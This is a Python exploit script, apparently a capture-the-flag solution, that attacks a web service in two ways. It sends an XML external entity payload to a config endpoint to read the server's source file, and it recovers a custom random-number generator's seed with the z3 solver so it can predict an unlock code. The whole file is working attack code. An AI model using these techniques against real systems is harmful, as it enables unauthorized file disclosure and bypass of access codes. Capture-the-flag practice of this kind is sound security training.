#!/usr/bin/python3
import requests, sys, re
import urllib.parse
import z3

URL=""
CONFIG='<?xml version="1.0" encoding="UTF-8"?>{}<config><location>&{};</location></config>'

s=z3.Solver()
seed=z3.BitVec("seed",128)
s.add(seed>=0)
s.add(seed<=0xFFFFFFFF)

def setup_real(seed):
	global real_state
	real_state=0
	for i in range(16):
		cur = seed & 3
		seed >>= 2
		real_state = (real_state << 4) | ((real_state & 3) ^ cur)
		real_state |= cur << 2

def next_real(bits):
	global real_state
	ret = 0
	for i in range(bits):
		ret <<= 1
		ret |= real_state & 1
		real_state = (real_state << 1) ^ (real_state >> 61)
		real_state &= 0xFFFFFFFFFFFFFFFF
		real_state ^= 0xFFFFFFFFFFFFFFFF

		for j in range(0, 64, 4):
			cur = (real_state >> j) & 0xF
			cur = (cur >> 3) | ((cur >> 2) & 2) | ((cur << 3) & 8) | ((cur << 2) & 4)
			real_state ^= cur << j
	return ret

def setup_symb():
	global symb_state, seed
	symb_state=z3.BitVecVal(0,128)
	for i in range(16):
		cur = seed & 3
		seed = z3.LShR(seed,2)
		symb_state = (symb_state << 4) | ((symb_state & 3) ^ cur)
		symb_state |= cur << 2

def next_symb(bits):
	global symb_state
	ret = 0
	for i in range(bits):
		ret <<= 1
		ret |= symb_state & 1
		symb_state = (symb_state << 1) ^  z3.LShR(symb_state, 61)
		symb_state &= 0xFFFFFFFFFFFFFFFF
		symb_state ^= 0xFFFFFFFFFFFFFFFF

		for j in range(0, 64, 4):
			cur = z3.LShR(symb_state, j) & 0xF
			cur = z3.LShR(cur , 3) | (z3.LShR(cur , 2) & 2) | ((cur << 3) & 8) | ((cur << 2) & 4)
			symb_state ^= cur << j
	return ret

def add_solver(symb,real):
	global s
	s.add(symb==real)

def check():
	res_sat=s.check()
	if str(res_sat)=='sat':
		real_seed=s.model()
		return real_seed[real_seed[0]].as_long()
	return 0

def getConfig():
	res=requests.get(URL+"/get-config")
	return res.text

def setConfig( doctype,config):
	url_parsed_config=urllib.parse.quote(CONFIG.format(doctype,config))
	res=requests.get(URL+"/set-config?data="+url_parsed_config)
	return res.text

def unlock(code, match):
	res=requests.post(URL+"/unlock",data = {"code":code}).text
	if(match):
		return int(re.search("^Code incorrect.  Expected ([0-9]+)",res).group(1))
	else:
		return res

if(len(sys.argv)>1):
	URL=input("Brand new URL: ")
	if(sys.argv[1]=="flag1"):
		setConfig('<!DOCTYPE foo [ <!ENTITY c SYSTEM "main.py" > ]>','c')
		print(getConfig())
	if(sys.argv[1]=="flag2"):
		LEN_BIT=26
		NUM_ITER=1
		
		setup_symb()
		print("[*] Retriving some numbers")
		for i in range(NUM_ITER):
			real_value=unlock(0, True)
			symb_value=next_symb(LEN_BIT)
			add_solver(real_value,symb_value)
		print("[*] Trying to recover the seed")
		real_seed=check()
		
		if(real_seed==0): 
			print("[!] Something went wrong try to reset the challenge")
			exit()
		print("[*] Seed found %d"%real_seed)
		setup_real(real_seed)
		for i in range(NUM_ITER):
			next_real(LEN_BIT)
		final_guess=next_real(LEN_BIT)
		print(unlock(final_guess,False))
else:
	print("Call with argument: flag1 or flag2")
	print("example ./x.py flag1")
